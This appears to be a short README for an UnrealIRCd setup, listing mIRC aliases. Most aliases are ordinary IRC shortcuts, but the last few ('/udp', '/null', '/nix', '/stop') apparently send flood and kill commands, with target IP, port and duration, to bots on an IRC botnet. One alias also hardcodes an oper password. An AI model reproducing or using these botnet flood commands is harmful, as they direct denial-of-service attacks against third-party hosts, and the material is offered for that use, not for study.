# UnrealIRCD
IRC Easy Setup lulz

// Uploaded by MrScythe this is a clean version of Unreal, I Haven't moddded it but i'll be uploaded my personal modify
version here when I get time lulz enjoy doe

[MIRC Script] / [IRC Script]

/op /oper test bitchmade | /samode $chan +q $me | /samode $chan +q $me | /n 
/j /join #$$1 $2- 
/p /part # 
/ping /ctcp $$1 ping 
/w /whois $$1 /s /server $$1- 
/k /kick # $$1 $2- 
/q /query $$1 /send /dcc send $1 $2 /chat /dcc chat $1 
/hi /say this is the line 
/ping /ctcp $$1 ping 
/s /server $$1- 
/op1 /mode # +ooo $$1 $2 $3 
/chat2 /Query $$?="Chat With..." 
/n /names $chan
/nix /say !* unknown $$?="IP" $$?="time" 
/stop /say !* killall 
/boss /sethost Boss
/udp /say .udp $$?="IP" $$?="Port" $$?="Delay" $$?="time"
/null /say !* SH perl null $$?="IP" $$?="Port" $$?="Time"
